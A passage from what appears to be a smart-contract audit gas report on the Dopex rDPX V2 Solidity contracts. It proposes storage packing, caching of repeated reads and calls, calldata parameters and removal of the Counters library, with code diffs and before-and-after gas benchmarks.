[From the docs](https://docs.soliditylang.org/en/v0.8.21/internals/layout_in_storage.html):"For contracts that use inheritance, the ordering of state variables is determined by the C3-linearized order of contracts starting with the most base-ward contract. If allowed by the above rules, state variables from different contracts do share the same storage slot."

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L28-L98

### We can save 1 SLOT here by packing `bool _paused` from the contract `pausable` with the variable `collateralToken` in the inheriting contract. (Save 1 SLOT: 2K gas)

*Part of this borrows some part from the above finding*
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
contract PerpetualAtlanticVault is
  IPerpetualAtlanticVault,
  ReentrancyGuard,
  Pausable,
  ERC721,
  ERC721Enumerable,
  ERC721Burnable,
  AccessControl,
  ContractWhitelist
{
42:  Counters.Counter private _tokenIdCounter;
    <Truncated>
56:  /// @dev Collateral Token
57:  IERC20WithBurn public collateralToken;
      <Truncated>

 94: /// @dev genesis timestamp
 95: uint256 public genesis;
	<Truncated>

97:  /// @dev the timestamp of the last update where funding was paid for
98:  uint256 public lastUpdateTime;
```

In the contract `Pausable`  we have a state variable of type `boolean`. According to solidity docs, if allowed by the rules of inheritance, variables from different contracts can be packed together.
This would mean, we move the `Pausable` to be the last contract inherited so that the `bool _paused` from that contract can be packed with variables in the inheriting contract. I've moved the `collateralToken, genesis,lastUpdateTime ` to the top of the contract so that the variable `_paused` is packed together with `collateralToken` as they are accessed in the same transaction

```diff
 contract PerpetualAtlanticVault is
   IPerpetualAtlanticVault,
   ReentrancyGuard,
-  Pausable,
   ERC721,
   ERC721Enumerable,
   ERC721Burnable,
   AccessControl,
-  ContractWhitelist
+  ContractWhitelist,
+  Pausable
 {
   using SafeERC20 for IERC20WithBurn;
   using Counters for Counters.Counter;

+  /// @dev Collateral Token
+  IERC20WithBurn public collateralToken;
+    /// @dev genesis timestamp
+  uint40 public genesis;
+
+  /// @dev the timestamp of the last update where funding was paid for
+  uint40 public lastUpdateTime;
   /// @dev Token ID counter for write positions
   Counters.Counter private _tokenIdCounter;

@@ -53,9 +60,6 @@ contract PerpetualAtlanticVault is
   /// @dev Contract addresses
   Addresses public addresses;

-  /// @dev Collateral Token
-  IERC20WithBurn public collateralToken;
-
   /// @dev The precision of the collateral token
   uint256 public collateralPrecision;

@@ -91,12 +95,6 @@ contract PerpetualAtlanticVault is
   /// @dev the total number of active options
   uint256 public totalActiveOptions;

-  /// @dev genesis timestamp
-  uint256 public genesis;
-
-  /// @dev the timestamp of the last update where funding was paid for
-  uint256 public lastUpdateTime;
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L33-L67

### Reorder the order of variable declaration to allow packing variables from child contracts (Save 1 SLOT: 2K gas)

**We can pack the variable `_paused` from the contract `Pausable` with the variable `isReLPActive and putOptionsRequired` in the inheriting contract**
```solidity
File: /contracts/core/RdpxV2Core.sol
33:contract RdpxV2Core is
34:  IRdpxV2Core,
35:  AccessControl,
36:  ContractWhitelist,
37:  ERC721Holder,
38:  Pausable
39: {

47:  Addresses public addresses;

50:  PricingOracleAddresses public pricingOracleAddresses;

115:  bool public isReLPActive;

118:  bool public putOptionsRequired;
```
By just moving the bools to the top, we allow the inherited variable `_paused` to be packed with the variables we've just moved to the top
*There was a possibility of packing with address `weth` but this was suggested to be made immutable by the bot*
```diff
+  /// @notice Whether reLP is active or not
+  bool public isReLPActive;

+  /// @notice Whether put options are requred
+  bool public putOptionsRequired;
+
   /// @notice Addresses used by the contract
   Addresses public addresses;

@@ -111,12 +116,6 @@ contract RdpxV2Core is
   /// @notice Total weth delegated
   uint256 public totalWethDelegated;

-  /// @notice Whether reLP is active or not
-  bool public isReLPActive;
-
-  /// @notice Whether put options are requred
-  bool public putOptionsRequired;
```

## [G-04] Function calls should be cached instead of calling them more than once in same transaction

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L594-L614

### Result of `nextFundingPaymentTimestamp()` should be cached instead of repeatedly calling it (Save 777 Gas on average)

Gas benchmarks based on function `Purchase()` which calls our private function `_updateFundingRate`

*`Test: Purchase(uint256,address)(uint256)`*

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 312368    | 333657   | 333657 | 354946 |
| After  | 311846    | 332880   | 332880 | 353914 |

*`Test: Purchase(uint256,address)(uint256,uint256)`*

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 17877    | 256930   | 221256 | 359646 |
| After | 17877 | 256498 | 221256 | 358614 |

```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
594:  function _updateFundingRate(uint256 amount) private {
595:    if (fundingRates[latestFundingPaymentPointer] == 0) {
596:      uint256 startTime;
597:      if (lastUpdateTime > nextFundingPaymentTimestamp() - fundingDuration) {
598:        startTime = lastUpdateTime;
599:      } else {
600:        startTime = nextFundingPaymentTimestamp() - fundingDuration;
601:      }
602:      uint256 endTime = nextFundingPaymentTimestamp();

606:    } else {
607:      uint256 startTime = lastUpdateTime;
608:      uint256 endTime = nextFundingPaymentTimestamp();
```

If we look into the implementation of the function `nextFundingPaymentTimestamp` which is being called several times, we can see we read three state variables `genesis,latestFundingPaymentPointer,fundingDuration`
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L563-L569
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
563:  function nextFundingPaymentTimestamp()
564:    public
565:    view
566:    returns (uint256 timestamp)
567:  {
568:    return genesis + (latestFundingPaymentPointer * fundingDuration);
569:  }
```
Every time we call this function, we end up making 3 state reads, which can be quite expensive. We should refactor the code as follows to only call this function once, ie reading from state only once and caching the function result.

```diff

   function _updateFundingRate(uint256 amount) private {
+     uint256 _nextFundingPaymentTimestamp = nextFundingPaymentTimestamp();
     if (fundingRates[latestFundingPaymentPointer] == 0) {
       uint256 startTime;
-      if (lastUpdateTime > nextFundingPaymentTimestamp() - fundingDuration) {
+
+      if (lastUpdateTime > _nextFundingPaymentTimestamp - fundingDuration) {
         startTime = lastUpdateTime;
       } else {
-        startTime = nextFundingPaymentTimestamp() - fundingDuration;
+        startTime = _nextFundingPaymentTimestamp - fundingDuration;
       }
-      uint256 endTime = nextFundingPaymentTimestamp();
+
       fundingRates[latestFundingPaymentPointer] =
         (amount * 1e18) /
-        (endTime - startTime);
+        (_nextFundingPaymentTimestamp - startTime);
     } else {
       uint256 startTime = lastUpdateTime;
-      uint256 endTime = nextFundingPaymentTimestamp();
-      if (endTime == startTime) return;
+      if (_nextFundingPaymentTimestamp == startTime) return;
       fundingRates[latestFundingPaymentPointer] =
         fundingRates[latestFundingPaymentPointer] +
-        ((amount * 1e18) / (endTime - startTime));
+        ((amount * 1e18) / (_nextFundingPaymentTimestamp - startTime));
     }
   }

```

## [G-05] Use calldata instead of memory for function parameters

If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.

Note that I've also flagged instances where the function is public but can be marked as external since it's not called by the contract, and cases where a constructor is involved.

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L240-L243

### Use calldata for `_assetSymbol` (Save 318 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 96795    | 104095   | 97365 | 118125 |
| After | 96477 | 103777 | 97047 | 117807 |
```solidity
File: /contracts/core/RdpxV2Core.sol
240:  function addAssetTotokenReserves(
241:    address _asset,
242:    string memory _assetSymbol
243:  ) external onlyRole(DEFAULT_ADMIN_ROLE) {
```

```diff
   function addAssetTotokenReserves(
     address _asset,
-    string memory _assetSymbol
+    string calldata _assetSymbol
   ) external onlyRole(DEFAULT_ADMIN_ROLE) {
     require(_asset != address(0), "RdpxV2Core: asset cannot be 0 address");
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L270-L272

### Use calldata for `_assetSymbol`

```solidity
File: /contracts/core/RdpxV2Core.sol
270:  function removeAssetFromtokenReserves(
271:    string memory _assetSymbol
272:  ) external onlyRole(DEFAULT_ADMIN_ROLE) {
```

```diff
   function removeAssetFromtokenReserves(
-    string memory _assetSymbol
+    string calldata _assetSymbol
   ) external onlyRole(DEFAULT_ADMIN_ROLE) {
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L764-L766

### Use calldata for `optionIds` (Save 646 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 19746    | 64123   | 42398 | 136328 |
| After | 19070 | 63477 | 41831 | 135036 |
```solidity
File: /contracts/core/RdpxV2Core.sol
764:  function settle(
765:    uint256[] memory optionIds
766:  )
```

```diff
   function settle(
-    uint256[] memory optionIds
+    uint256[] calldata optionIds
   )
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L819-L824

### Change to external and use calldata for `_amounts` and `_delegateIds ` (Save 768 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 2159    | 847375   | 1092279 | 1705471 |
| After | 1584 | 846607 | 1091594 | 1704182 |
```solidity
File: /contracts/core/RdpxV2Core.sol
819:  function bondWithDelegate(
820:    address _to,
821:    uint256[] memory _amounts,
822:    uint256[] memory _delegateIds,
823:    uint256 rdpxBondId
824:  ) public returns (uint256 receiptTokenAmount, uint256[] memory) {
```

```diff
   function bondWithDelegate(
     address _to,
-    uint256[] memory _amounts,
-    uint256[] memory _delegateIds,
+    uint256[] calldata _amounts,
+    uint256[] calldata _delegateIds,
     uint256 rdpxBondId
   ) public returns (uint256 receiptTokenAmount, uint256[] memory) {
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1135-L1137

### Change to external and use calldata on `_token` (Save 536 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 3699    | 5099   | 3699 | 13699 |
| After | 3163 | 4563 | 3163 | 13163 |
```solidity
File: /contracts/core/RdpxV2Core.sol
1135:  function getReserveTokenInfo(
1136:    string memory _token
1137:  ) public view returns (address, uint256, string memory) {
```

```diff
   function getReserveTokenInfo(
-    string memory _token
+    string calldata _token
   ) public view returns (address, uint256, string memory) {
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L317

### Use calldata for `optionIds` (Save 596 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 17113    | 60186   | 56770 | 127485 |
| After | 16897 | 59890 | 56420 | 126616 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
315:  function settle(
316:    uint256[] memory optionIds
317:  )
```

```diff
   /// @inheritdoc      IPerpetualAtlanticVault
   function settle(
-    uint256[] memory optionIds
+    uint256[] calldata optionIds
   )
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L405-L407

### Use calldata for `strikes` (Save 233 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 64779    | 99013   | 101124 | 154379 |
| After | 64485 | 98780 | 100909 | 154085 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
405:  function calculateFunding(
406:    uint256[] memory strikes
407:  ) external nonReentrant returns (uint256 fundingAmount) {
```

```diff
   function calculateFunding(
-    uint256[] memory strikes
+    uint256[] calldata strikes
   ) external nonReentrant returns (uint256 fundingAmount) {
```


## [G-06] Use uint256 instead of the counter library

The counters version runs 6 more instructions than the uint version  due to the counters code needing to jump into the Counters library.
The 6 added instructions are: 2 JUMPs, 2 JUMPDESTs, and 2 PUSH1s. These are used to jump from the current executing code to the library function that actually handles the increment logic. The total gas costs of these operations is 24 units
In addition to using more gas, using the Counters library also results in a larger deployment size
See [More Info](https://twitter.com/0xCygaar/status/1608562486508417025)


**Note:The counters library is also being deprecated**https://github.com/OpenZeppelin/openzeppelin-contracts/pull/4289

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L9

### RdpxV2Bond.sol.mint(): get rid of counters (Save 109 Gas)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 105847    | 113510   | 115747 | 117747 |
| After  | 105738    | 113401   | 115638 | 117638 |

```solidity
File: /contracts/core/RdpxV2Bond.sol
9:import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";

18:  using Counters for Counters.Counter;


20:  Counters.Counter private _tokenIdCounter;
```
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L37-L43
```solidity
File: /contracts/core/RdpxV2Bond.sol
37:  function mint(
38:    address to
39:  ) public onlyRole(MINTER_ROLE) returns (uint256 tokenId) {
40:    tokenId = _tokenIdCounter.current();
41:    _tokenIdCounter.increment();
42:    _mint(to, tokenId);
43:  }
```


```diff
-import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";

 contract RdpxV2Bond is
   ERC721,
@@ -15,9 +14,8 @@ contract RdpxV2Bond is
   AccessControl,
   ERC721Burnable
 {
-  using Counters for Counters.Counter;

-  Counters.Counter private _tokenIdCounter;
+  uint256 private _tokenIdCounter;

   bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

@@ -37,8 +35,10 @@ contract RdpxV2Bond is
   function mint(
     address to
   ) public onlyRole(MINTER_ROLE) returns (uint256 tokenId) {
-    tokenId = _tokenIdCounter.current();
-    _tokenIdCounter.increment();
+    tokenId = _tokenIdCounter;
+    unchecked{
+      ++_tokenIdCounter;
+    }
     _mint(to, tokenId);
   }

```


**Similar Instance**

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L13

### RdpxDecayingBonds.sol.mintToken() : save 162 Gas

**Benchmarks based on function `mint()` which calls the function `mintToken()`

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 184661    | 192194   | 195461 | 197461 |
| After  | 184529    | 192062   | 195329 | 197329 |
```solidity
File: /contracts/decaying-bonds/RdpxDecayingBonds.sol
13:import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";

26:  using Counters for Counters.Counter;

28:  Counters.Counter private _tokenIdCounter;

56:  constructor(

59:  ) ERC721(_name, _symbol) {

63:    _tokenIdCounter.increment();
64:  }
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L129-L133
```solidity
File: /contracts/decaying-bonds/RdpxDecayingBonds.sol
129:  function _mintToken(address to) private returns (uint256 tokenId) {
130:    tokenId = _tokenIdCounter.current();
131:    _tokenIdCounter.increment();
132:    _mint(to, tokenId);
133:  }
```

```diff
-import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";

 // Interfaces
 import { IERC20WithBurn } from "../interfaces/IERC20WithBurn.sol";
@@ -23,9 +22,8 @@ contract RdpxDecayingBonds is
   AccessControl
 {
   using SafeERC20 for IERC20WithBurn;
-  using Counters for Counters.Counter;

-  Counters.Counter private _tokenIdCounter;
+  uint256 private _tokenIdCounter;

   // Create a new role identifier for the minter role
   bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
@@ -60,7 +58,9 @@ contract RdpxDecayingBonds is
     // Grant the minter role and admin role to deployer
     _setupRole(MINTER_ROLE, msg.sender);
     _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
-    _tokenIdCounter.increment();
+    unchecked {
+      ++_tokenIdCounter;
+    }
   }

   /*============ ADMIN FUNCTIONS ============*/
@@ -127,8 +127,10 @@ contract RdpxDecayingBonds is
   /// @dev Internal function to mint a bond position token
   /// @param to the address to mint the position to
   function _mintToken(address to) private returns (uint256 tokenId) {
-    tokenId = _tokenIdCounter.current();
-    _tokenIdCounter.increment();
+    tokenId = _tokenIdCounter;
+    unchecked{
+      ++_tokenIdCounter;
+    }
     _mint(to, tokenId);
   }

```

**Another instance**
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L14

### PerpetualAtlanticVault.sol.\_mintOptionToken(): (Save ~132 Gas on average)

*Benchmarks based on function purchase which calls the private function `_mintOptionToken()`*

*`Test: Purchase(uint256,address)(uint256)`*

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 312368    | 333657   | 333657 | 354946 |
| After  | 312236    | 333525   | 333525 | 354814 |

*`Test: Purchase(uint256,address)(uint256,uint256)`*

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 17877    | 256930   | 221256 | 359646 |
| After  | 17877    | 256809   | 221124 | 359515 |

```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
14:import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";

39:  using Counters for Counters.Counter;

41:  /// @dev Token ID counter for write positions
42:  Counters.Counter private _tokenIdCounter;
```
https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L588-L592
```solidity
588:  function _mintOptionToken() private returns (uint256 tokenId) {
589:    tokenId = _tokenIdCounter.current();
590:    _tokenIdCounter.increment();
591:    _mint(addresses.rdpxV2Core, tokenId);
592:  }
```

```diff
-import { Counters } from "@openzeppelin/contracts/utils/Counters.sol";
 import { IPerpetualAtlanticVaultLP } from "./IPerpetualAtlanticVaultLP.sol";
 import { ContractWhitelist } from "../helper/ContractWhitelist.sol";
 import { Pausable } from "../helper/Pausable.sol";
@@ -36,10 +35,9 @@ contract PerpetualAtlanticVault is
   ContractWhitelist
 {
   using SafeERC20 for IERC20WithBurn;
-  using Counters for Counters.Counter;

   /// @dev Token ID counter for write positions
-  Counters.Counter private _tokenIdCounter;
+  uint256 private _tokenIdCounter;

   /// @dev Manager role which handles bootstrapping
   bytes32 public constant MANAGER_ROLE = keccak256("MANAGER_ROLE");
@@ -352,7 +350,7 @@ contract PerpetualAtlanticVault is
     // Transfer rdpx from rdpx rdpxV2Core to perpetual vault
     IERC20WithBurn(addresses.rdpx).safeTransferFrom(
       addresses.rdpxV2Core,
-      addresses.perpetualAtlanticVaultLP,
+      addresses.perpetualAtlanticVaultLP,//@audit Cache this call?
       rdpxAmount
     );

@@ -586,8 +584,10 @@ contract PerpetualAtlanticVault is

   /// @dev Internal function to mint a option token
   function _mintOptionToken() private returns (uint256 tokenId) {
-    tokenId = _tokenIdCounter.current();
-    _tokenIdCounter.increment();
+    tokenId = _tokenIdCounter;
+    unchecked {
+      ++_tokenIdCounter;
+    }
     _mint(addresses.rdpxV2Core, tokenId);
   }

```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/reLP/ReLPContract.sol#L138-L164

## [G-07] Since we are assigning local values to the struct, we shouldn't read the struct(state) in the same transactions, simply use the local variables (Save 427 Gas)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 285281    | 285281   | 285281 | 285281 |
| After | 284854 | 284854 | 284854 | 284854 |
```solidity
File: /contracts/reLP/ReLPContract.sol
138:    addresses = Addresses({
139:      tokenA: _tokenA,
140:      tokenB: _tokenB,
141:      pair: _pair,
        <Truncated>
145:      rdpxOracle: _rdpxOracle,
146:      ammFactory: _ammFactory,
147:      ammRouter: _ammRouter
148:    });


150:    IERC20WithBurn(addresses.pair).safeApprove(
151:      addresses.ammRouter,
152:      type(uint256).max
153:    );


155:    IERC20WithBurn(addresses.tokenA).safeApprove(
156:      addresses.ammRouter,
157:      type(uint256).max
158:    );


160:    IERC20WithBurn(addresses.tokenB).safeApprove(
161:      addresses.ammRouter,
162:      type(uint256).max
163:    );
164:  }
```

```diff

-    IERC20WithBurn(addresses.pair).safeApprove(
-      addresses.ammRouter,
+    IERC20WithBurn(_pair).safeApprove(
+      _ammRouter,
       type(uint256).max
     );

-    IERC20WithBurn(addresses.tokenA).safeApprove(
-      addresses.ammRouter,
+    IERC20WithBurn(_tokenA).safeApprove(
+      _ammRouter,
       type(uint256).max
     );

-    IERC20WithBurn(addresses.tokenB).safeApprove(
-      addresses.ammRouter,
+    IERC20WithBurn(_tokenB).safeApprove(
+      _ammRouter,
       type(uint256).max
     );
   }
```

## [G-08] When using storage instead of memory, we should cache any fields that need to be re-read in stack variables 

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L980-L985
```solidity
File: /contracts/core/RdpxV2Core.sol
980:    Delegate storage delegate = delegates[delegateId];
981:    _validate(delegate.owner == msg.sender, 9);

983:    amountWithdrawn = delegate.amount - delegate.activeCollateral;
984:    _validate(amountWithdrawn > 0, 15);
985:    delegate.amount = delegate.activeCollateral;
```

```diff
diff --git a/contracts/core/RdpxV2Core.sol b/contracts/core/RdpxV2Core.sol
index e28a65c..951ab24 100644
--- a/contracts/core/RdpxV2Core.sol
+++ b/contracts/core/RdpxV2Core.sol
@@ -979,10 +979,11 @@ contract RdpxV2Core is
     _validate(delegateId < delegates.length, 14);
     Delegate storage delegate = delegates[delegateId];
     _validate(delegate.owner == msg.sender, 9);
+    uint256 _activeCollateral = delegate.activeCollateral;

-    amountWithdrawn = delegate.amount - delegate.activeCollateral;
+    amountWithdrawn = delegate.amount - _activeCollateral;
     _validate(amountWithdrawn > 0, 15);
-    delegate.amount = delegate.activeCollateral;
+    delegate.amount = _activeCollateral;
```

## [G-9] We can cache some gas intensive operations

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396

### PerpetualAtlanticVault.sol.payFunding(): Cache the call `totalFundingForEpoch[latestFundingPaymentPointer]` (Save 669 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 3578    | 27125   | 34705 | 34705 |
| After | 3578 | 26456 | 33980 | 33980 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
372:  function payFunding() external onlyRole(RDPXV2CORE_ROLE) returns (uint256) {

382:    collateralToken.safeTransferFrom(
383:      addresses.rdpxV2Core,
384:      address(this),
385:      totalFundingForEpoch[latestFundingPaymentPointer]
386:    );
387:    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);


389:    emit PayFunding(
390:      msg.sender,
391:      totalFundingForEpoch[latestFundingPaymentPointer],
392:      latestFundingPaymentPointer
393:    );

395:    return (totalFundingForEpoch[latestFundingPaymentPointer]);
396:  }
```

```diff
diff --git a/contracts/perp-vault/PerpetualAtlanticVault.sol b/contracts/perp-vault/PerpetualAtlanticVault.sol
index 88ac2b3..16fb8a0 100644
--- a/contracts/perp-vault/PerpetualAtlanticVault.sol
+++ b/contracts/perp-vault/PerpetualAtlanticVault.sol
@@ -378,21 +378,22 @@ contract PerpetualAtlanticVault is
         fundingPaymentsAccountedFor[latestFundingPaymentPointer],
       6
     );
+    uint256 _totalFundingForEpoch = totalFundingForEpoch[latestFundingPaymentPointer];

     collateralToken.safeTransferFrom(
       addresses.rdpxV2Core,
       address(this),
-      totalFundingForEpoch[latestFundingPaymentPointer]
+      _totalFundingForEpoch
     );
-    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);
+    _updateFundingRate(_totalFundingForEpoch);

     emit PayFunding(
       msg.sender,
-      totalFundingForEpoch[latestFundingPaymentPointer],
+      _totalFundingForEpoch,
       latestFundingPaymentPointer
     );

-    return (totalFundingForEpoch[latestFundingPaymentPointer]);
+    return (_totalFundingForEpoch);
   }

```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524

### We can cache some operations instead of repeatedly doing them (Save 490 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 11472    | 33743   | 39946 | 53946 |
| After | 10982 | 33253 | 39456 | 53456 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
510:    collateralToken.safeTransfer(
511:      addresses.perpetualAtlanticVaultLP,
512:      (currentFundingRate * (block.timestamp - startTime)) / 1e18
513:    );

515:    IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds(
516:      (currentFundingRate * (block.timestamp - startTime)) / 1e18
517:    );

519:    emit FundingPaid(
520:      msg.sender,
521:      ((currentFundingRate * (block.timestamp - startTime)) / 1e18),
522:      latestFundingPaymentPointer
523:    );
524:  }
```

```diff
+    uint256 _amount = (currentFundingRate * (block.timestamp - startTime)) / 1e18;
+
     collateralToken.safeTransfer(
       addresses.perpetualAtlanticVaultLP,
-      (currentFundingRate * (block.timestamp - startTime)) / 1e18
+      _amount
     );

     IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds(
-      (currentFundingRate * (block.timestamp - startTime)) / 1e18
+      _amount
     );

     emit FundingPaid(
       msg.sender,
-      ((currentFundingRate * (block.timestamp - startTime)) / 1e18),
+      _amount,
       latestFundingPaymentPointer
     );
   }
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L372-L396

### Cache `latestFundingPaymentPointer` in memory (Save  291 Gas)

**Not found by bot**

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 3578    | 27125   | 34705 | 34705 |
| After | 3581 | 26834 | 34390 | 34390 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
372:  function payFunding() external onlyRole(RDPXV2CORE_ROLE) returns (uint256) {

376:    _validate(
377:      totalActiveOptions ==
378:        fundingPaymentsAccountedFor[latestFundingPaymentPointer],
379:      6
380:    );

382:    collateralToken.safeTransferFrom(
383:      addresses.rdpxV2Core,
384:      address(this),
385:      totalFundingForEpoch[latestFundingPaymentPointer]
386:    );
387:    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);

389:    emit PayFunding(
390:      msg.sender,
391:      totalFundingForEpoch[latestFundingPaymentPointer],
392:      latestFundingPaymentPointer
393:    );

395:    return (totalFundingForEpoch[latestFundingPaymentPointer]);
396:  }
```

```diff
+    uint256 _latestFundingPaymentPointer = latestFundingPaymentPointer;
     _validate(
       totalActiveOptions ==
-        fundingPaymentsAccountedFor[latestFundingPaymentPointer],
+        fundingPaymentsAccountedFor[_latestFundingPaymentPointer],
       6
     );

+    uint256 __totalFundingForEpoch = totalFundingForEpoch[_latestFundingPaymentPointer];
     collateralToken.safeTransferFrom(
       addresses.rdpxV2Core,
       address(this),
-      totalFundingForEpoch[latestFundingPaymentPointer]
+      __totalFundingForEpoch
     );
-    _updateFundingRate(totalFundingForEpoch[latestFundingPaymentPointer]);
+    _updateFundingRate(__totalFundingForEpoch);

     emit PayFunding(
       msg.sender,
-      totalFundingForEpoch[latestFundingPaymentPointer],
-      latestFundingPaymentPointer
+      __totalFundingForEpoch,
+      _latestFundingPaymentPointer
     );

-    return (totalFundingForEpoch[latestFundingPaymentPointer]);
+    return (__totalFundingForEpoch);
   }

```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L966-L967

### We don't have to do `delegates.length - 1` twice especially because we are reading from storage (Save 136 Gas on average)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 648    | 85946   | 77526 | 158526 |
| After | 648 | 85810 | 77350 | 158350 |
```solidity
File: /contracts/core/RdpxV2Core.sol
966:    emit LogAddToDelegate(_amount, _fee, delegates.length - 1);
967:    return (delegates.length - 1);
```

```diff

-    emit LogAddToDelegate(_amount, _fee, delegates.length - 1);
-    return (delegates.length - 1);
+    uint256 _delegateLengthEmit = delegates.length - 1;
+
+    emit LogAddToDelegate(_amount, _fee, _delegateLengthEmit);
+    return (_delegateLengthEmit);
   }

```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L369

### PerpetualAtlanticVault.sol.settle(): `addresses.perpetualAtlanticVaultLP` should be cached (Save 139 Gas)

|        | Min    | Average | Median   | Max   |
| ------ | --- | ------- | ----- | ----- |
| Before | 17113    | 60186   | 56770 | 127485 |
| After | 17234 | 60047 | 56664 | 127152 |
```solidity
File: /contracts/perp-vault/PerpetualAtlanticVault.sol
